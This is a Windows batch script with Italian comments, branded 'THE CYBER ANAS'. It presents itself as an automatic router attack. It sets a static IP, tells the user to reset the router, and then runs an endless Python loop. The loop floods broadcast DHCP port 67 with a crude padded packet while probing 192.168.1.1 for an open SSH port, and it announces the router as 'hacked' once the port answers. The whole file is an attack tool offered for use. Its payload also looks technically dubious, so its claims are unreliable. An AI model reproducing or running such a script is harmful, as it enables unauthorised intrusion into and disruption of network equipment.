@echo off
:: Forza l'esecuzione come Amministratore per configurare la rete
title THE CYBER ANAS - PILOTA AUTOMATICO TOTALE
color 0b

:START
cls
echo ======================================================
echo    THE CYBER ANAS - MODALITA' "FAI TUTTO DA SOLO"
echo ======================================================
echo.

:: 1. CONFIGURAZIONE RETE (Ethernet 3)
echo [+] Configurazione Ethernet 3 in corso...
netsh interface ip set address name="Ethernet 3" static 192.168.1.100 255.255.255.0 >nul 2>&1
echo [+] Stato: Scheda pronta su 192.168.1.100.
echo.

:: 2. MOTORE DI ATTACCO AUTOMATICO
echo [!] IN ATTESA DEL ROUTER... (Fai il RESET di 5 secondi ora)
echo [!] Porta consigliata: WAN (Rossa) per bypassare i corti.
echo.

:: Usiamo 'py' perche' il tuo sistema riconosce questo comando
py -c "
import socket, time
def run():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    payload = b'\x02\x01\x06\x00' + b'\x00' * 296
    count = 0
    while True:
        try:
            s.sendto(payload, ('255.255.255.255', 67))
            count += 1
            if count %% 50 == 0:
                print(f'      Attacchi inviati: {count}', end='\r')
            
            # Controlla se il router ha aperto la porta SSH
            check = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            check.settimeout(0.05)
            if check.connect_ex(('192.168.1.1', 22)) == 0:
                print('\n\n[!!!] BINGO! ROUTER BUCATO DA CYBER ANAS! [!!!]')
                break
            check.close()
        except:
            pass
        time.sleep(0.01)
run()
"

echo.
echo ======================================================
echo    ATTACCO COMPLETATO O ROUTER RIAVVIATO
echo    Il sistema ripartira' da solo tra 5 secondi...
echo ======================================================
timeout /t 5
goto START
